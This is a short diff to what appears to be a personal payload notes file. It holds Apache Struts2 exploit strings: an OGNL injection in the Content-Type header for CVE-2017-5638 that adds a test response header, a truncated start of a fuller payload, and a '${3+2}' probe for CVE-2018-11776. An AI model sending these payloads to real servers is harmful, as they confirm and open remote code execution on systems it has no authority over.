@@ -1,5 +1,8 @@
 #payload from internet #notmine
-Apache-Struts2 Exploit Payload - Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-dr4gonw4ll-POC',4*4)}.multipart/form-data
+
+Apache-Struts2 Exploit CVE-2017-5638 Payload - 
+Content-Type: ${(#_='multipart/form-data').
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-dr4gonw4ll-POC',4*4)}.multipart/form-data
 
 
 Struts2 Remote Code Execution vulnerability CVE-2018-11776 - ${3+2} 
